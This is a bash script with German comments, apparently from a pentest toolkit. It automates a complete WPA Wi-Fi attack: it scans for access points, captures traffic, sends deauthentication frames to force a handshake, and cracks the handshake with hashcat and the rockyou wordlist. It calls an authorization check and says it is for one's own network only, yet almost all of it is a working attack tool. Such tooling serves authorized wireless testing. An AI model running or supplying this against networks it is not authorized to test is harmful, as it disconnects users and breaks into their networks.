#!/usr/bin/env bash
# wpa-quick-crack.sh - End-to-End: scannen, target picken, handshake, cracken
# Interaktiv. Nur auf authorisierte BSSIDs.
set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
source "$TOOLKIT/scripts/lib/logging.sh"
source "$TOOLKIT/scripts/lib/auth_check.sh"

IFACE="${1:-}"
[[ -z "$IFACE" ]] && {
    echo "Usage: $0 <monitor_iface>"
    echo "Tipp: vorher wifi-monitor-start.sh starten"
    exit 1
}

# 1. Scan (30 Sekunden)
outdir="$(make_outdir captures quickcrack-$(date +%s))"
log_info "Scan 30s..."
sudo timeout 30 airodump-ng --output-format csv -w "$outdir/scan" "$IFACE" >/dev/null 2>&1 || true

csv="$outdir/scan-01.csv"
[[ -f "$csv" ]] || { log_err "Kein Scan-Output"; exit 1; }

# Liste APs mit ESSID/BSSID/Channel
log_info "Sichtbare Netze:"
awk -F, 'BEGIN{p=0} /^BSSID/{p=1; next} /^Station/{p=0} p && length($1)>5 {
    gsub(/^ +| +$/, "", $1); gsub(/^ +| +$/, "", $4); gsub(/^ +| +$/, "", $14)
    if ($14 != "") printf "  %s | ch %s | %s\n", $1, $4, $14
}' "$csv"

read -r -p "BSSID: " BSSID
read -r -p "Channel: " CH
read -r -p "SSID (optional): " SSID

require_auth "$BSSID"
[[ -n "$SSID" ]] && require_auth "$SSID"

# 2. Capture
log_info "Capture starten - Strg+C wenn Handshake captured oder 90s vorbei"
prefix="$outdir/cap"
sudo timeout 90 airodump-ng --bssid "$BSSID" --channel "$CH" \
    --write "$prefix" --output-format pcap "$IFACE" &
APID=$!
sleep 5
log_info "Sende 5 deauths (eigenes Netz only)"
sudo aireplay-ng --deauth 5 -a "$BSSID" "$IFACE" || true
wait $APID 2>/dev/null || true

cap="$prefix-01.cap"
[[ -f "$cap" ]] || { log_err "Keine Capture"; exit 1; }

# 3. Konvert
hc="$outdir/cap.hc22000"
hcxpcapngtool -o "$hc" "$cap" || { log_err "Keine Handshake im Capture"; exit 1; }
[[ -s "$hc" ]] || { log_err "Leerer hc22000 - kein Handshake"; exit 1; }
log_ok "Handshake $hc"

# 4. Crack
WL="${WORDLIST:-$TOOLKIT/wordlists/rockyou.txt}"
[[ -f "$WL" ]] || { log_err "Wordlist fehlt: $WL"; exit 1; }
log_info "hashcat -m 22000 $hc $WL"
hashcat -m 22000 -a 0 "$hc" "$WL" --outfile "$outdir/cracked.txt" --outfile-format=2 || true

hashcat -m 22000 "$hc" --show | tee "$outdir/result.txt"
log_ok "Output: $outdir"
